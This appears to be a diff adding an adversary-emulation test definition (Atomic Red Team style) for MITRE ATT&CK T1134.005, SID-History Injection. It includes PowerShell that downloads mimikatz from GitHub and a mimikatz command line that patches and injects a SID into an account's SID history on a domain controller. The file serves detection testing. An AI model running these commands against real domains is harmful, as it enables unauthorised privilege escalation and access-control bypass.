@@ -1,0 +1,44 @@
+attack_technique: T1134.005
+display_name: 'Access Token Manipulation: SID-History Injection'
+atomic_tests:
+- name: Injection SID-History with mimikatz
+  auto_generated_guid: 6bef32e5-9456-4072-8f14-35566fb85401
+  description: |
+    Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller
+  supported_platforms:
+    - windows
+  input_arguments:
+    sid_to_inject:
+      description: SID to inject into sidhistory
+      type: String
+      default: S-1-5-21-1004336348-1177238915-682003330-1134
+    sam_account_name:
+      description: Target account to modify
+      type: String
+      default: '$env:username'
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: Path
+      default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      #{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
+    cleanup_command: |
+      #{mimikatz_path} "sid::clear /sam:#{sam_account_name}" "exit"
